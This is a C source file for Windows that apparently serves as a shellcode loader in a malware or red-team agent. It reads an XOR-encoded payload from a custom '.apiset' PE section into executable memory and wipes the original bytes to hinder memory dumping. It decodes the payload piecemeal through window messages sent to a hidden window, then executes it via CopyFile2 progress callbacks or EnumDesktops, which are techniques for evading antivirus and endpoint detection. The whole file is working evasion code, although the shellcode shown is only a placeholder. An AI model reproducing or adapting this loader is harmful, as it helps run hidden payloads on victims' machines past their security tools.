#define UNICODE
#define _UNICODE

#include <Windows.h>
#include <winbase.h>
#include <CommCtrl.h>
#include <namedpipeapi.h>
#include <process.h>
#include <stdint.h>
#include <stdbool.h>
#include <fileapi.h> 
#include <heapapi.h>
#include <search.h>
#include "agent_utility.h"

HANDLE g_hTerminationEvent = 0;

#pragma data_seg(push, s, ".apiset")
// format: <DWORD key size><DWORD shellcode size><xor key><shellcode>
uint32_t g_enc_key_size = 3;
uint32_t g_shellcode_size = 6;
uint8_t g_enc_key[] = { 0x1, 0x2, 0x3 };
uint8_t g_shellcode[] = { 0x91, 0x92, 0x93, 0x91, 0x92, 0xc0 };
#pragma data_seg(pop, s)

typedef struct context_s context;
struct context_s {
	uint8_t* key;
	uint32_t key_offset;
	size_t key_size;
	uint8_t* data;
	uint32_t data_offset;
	size_t data_size;
	bool exit;
};

static uint8_t* read_section_info(uint8_t* dos_header) {
	uint8_t section_name[] = {'.', 'a', 'p', 'i', 's', 'e', 't'};
	PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)(dos_header + ((PIMAGE_DOS_HEADER)dos_header)->e_lfanew);
	uint32_t num_of_sections = pe->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pe);
	uint8_t* result = NULL;

	do
	{
		if (!memcmp(&pSection->Name, section_name, sizeof section_name)) {
			result = dos_header + pSection->VirtualAddress;
			break;
		}
		pSection += 1;
		num_of_sections -= 1;
	} while (num_of_sections);

	return result;
}

static void decode(context* ctx) {
	if (ctx->exit) return;
	uint32_t step = 100 + (rand() % 256);
	for (uint32_t i = 0; i < step; i++) {
		if (ctx->data_offset < ctx->data_size) {
			uint8_t k = ctx->key[ctx->key_offset];
			uint8_t c = ctx->data[ctx->data_offset];
			uint8_t r = (k & ~c) | (~k & c);
			ctx->data[ctx->data_offset] = r;
			ctx->key_offset++;
			ctx->data_offset++;
			if (ctx->key_offset >= ctx->key_size)
				ctx->key_offset = 0;
		}
		else {
			ctx->exit = true;
			break;
		}
	}
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	context* ctx = 0;
	switch (uMsg)
	{
	case WM_SYSKEYDOWN:
		if (wParam == GetCurrentProcessId()) {
			ctx = (context*)lParam;
			decode(ctx);
		}		
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	case WM_DESTROY:
		PostQuitMessage(0);
		return true;
	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}
}

static int __stdcall decrypt_shellcode(void* args) {
	HANDLE* pipes = (HANDLE*)args;
	uint32_t size = 0;
	uint32_t nRead = 0;
	HWND hwnd = 0;
	context* ctx = ZERO(context);

	// read the needed info in chunks
	if (!ReadFile(pipes[0], &ctx, sizeof ctx, &nRead, NULL)) goto exit;
	if (!ReadFile(pipes[0], &hwnd, sizeof hwnd, &nRead, NULL)) goto exit;

	// send me ssages to decrypt the content
	uint32_t pid = GetCurrentProcessId();
	while (!ctx->exit) {
		PostMessage(hwnd, WM_SYSKEYDOWN, pid, ctx);
	}
	PostMessage(hwnd, WM_QUIT, 0, 0);

exit:
	return 0;
}

static HMODULE get_current_module_handle(void) {
	HMODULE hModule = 0;
	MEMORY_BASIC_INFORMATION memInfo = { 0 };
	if (!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)get_current_module_handle, &hModule)) {
		size_t size = sizeof(MEMORY_BASIC_INFORMATION);
		size = VirtualQuery((void*)get_current_module_handle, &memInfo, size);
		hModule = (HMODULE)memInfo.AllocationBase;
	}
	return hModule;
}

static HWND create_window(void) {
	HINSTANCE hInstance = GetModuleHandle(NULL);
	WNDCLASS wc = { 0 };
	wc.lpfnWndProc = WindowProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = PROGRESS_CLASS;

	RegisterClass(&wc);

	// Create the window.
	HWND hwnd = CreateWindowEx(
		0,
		PROGRESS_CLASS,
		NULL,
		WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
		NULL,
		NULL,
		hInstance,
		NULL
	);
	return hwnd;
}

static BOOL CALLBACK call_shellcode_and_wait2(LPTSTR lpszDesktop, LPARAM lParam) {
	((void (*)(void))lParam)();
	SetEvent(g_hTerminationEvent);
	return FALSE;
}

static COPYFILE2_MESSAGE_ACTION _stdcall call_shellcode_and_wait(const COPYFILE2_MESSAGE* pMessage, PVOID pvCallbackContext) {
	((void (*)(void))pvCallbackContext)();
	SetEvent(g_hTerminationEvent);
	return COPYFILE2_PROGRESS_STOP;
}

void run(void) {
	// read config
	HMODULE hModule = get_current_module_handle();
	context ctx = { 0 };
	context* p_ctx = &ctx;

	uint8_t* config_section = read_section_info((uint8_t*)hModule);
	ctx.key_size = *((uint32_t*)config_section);
	config_section += 4;
	ctx.data_size = *((uint32_t*)config_section);
	config_section += 4;

	uint8_t* addr = (uint8_t*)VirtualAlloc(NULL, ctx.data_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!addr) goto exit;
	ctx.data = addr;
	ctx.key = MEM_ALLOC(ctx.key_size);
	if (!ctx.key) goto exit;

	memcpy(ctx.key, config_section, ctx.key_size);
	config_section += ctx.key_size;
	memcpy(addr, config_section, ctx.data_size);

	// zero-out the config-section to avoid dumping from memory
	uint32_t old_protection = 0;
	if (VirtualProtect(config_section, ctx.data_size, PAGE_READWRITE, &old_protection))
		memset(config_section, 0x00, ctx.data_size);

	// create a windows used to deobfuscate the shellcode
	HWND hwnd = create_window();

	// create the pipe that will decrypt the shellcode in another thread
	SECURITY_ATTRIBUTES saAttr = { 0 };
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	HANDLE pipes[2] = { 0 };
	if (!CreatePipe(&pipes[0], &pipes[1], &saAttr, 0)) goto exit;
	HANDLE thread = (HANDLE)_beginthreadex(
		NULL,
		0,
		(_beginthreadex_proc_type)decrypt_shellcode,
		(void*)pipes,
		0,
		NULL
	);
	if (!thread) goto exit;
	
	// write the needed info for the deobfuscation
	uint32_t nRead = 0;
	if (!WriteFile(pipes[1], &p_ctx, sizeof p_ctx, &nRead, NULL)) goto exit;
	if (!WriteFile(pipes[1], &hwnd, sizeof hwnd, &nRead, NULL)) goto exit;
	
	// Run the message loop.
	MSG msg = { 0 };
	while (GetMessage(&msg, hwnd, 0, WM_KEYLAST)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
	// wait for completation and cleanup
	WaitForSingleObject((HANDLE)thread, INFINITE);	
	CloseHandle(pipes[0]);
	CloseHandle(pipes[1]);
	DestroyWindow(hwnd);
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, ctx.key);
		
	// dynamically resolve the function since in Windows 7 it is not supported
	FARPROC func_CopyFile2 = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "CopyFile2");
	if (func_CopyFile2) {
		// execute the shellcode through the CopyFile2 function
		COPYFILE2_EXTENDED_PARAMETERS extended_params = { 0 };
		extended_params.dwSize = sizeof(COPYFILE2_EXTENDED_PARAMETERS);
		extended_params.dwCopyFlags = COPY_FILE_NO_BUFFERING;
		extended_params.pvCallbackContext = addr;
		extended_params.pProgressRoutine = (PCOPYFILE2_PROGRESS_ROUTINE)call_shellcode_and_wait;
		TCHAR file_name[MAX_PATH] = { 0 };
		((HRESULT (_stdcall*)(PCWSTR, PCWSTR, PVOID))func_CopyFile2)(file_name, file_name, &extended_params);
	}
	else {
		EnumDesktops(GetProcessWindowStation(), (DESKTOPENUMPROCW)call_shellcode_and_wait2, addr);
	}
	
exit:
	return;
}
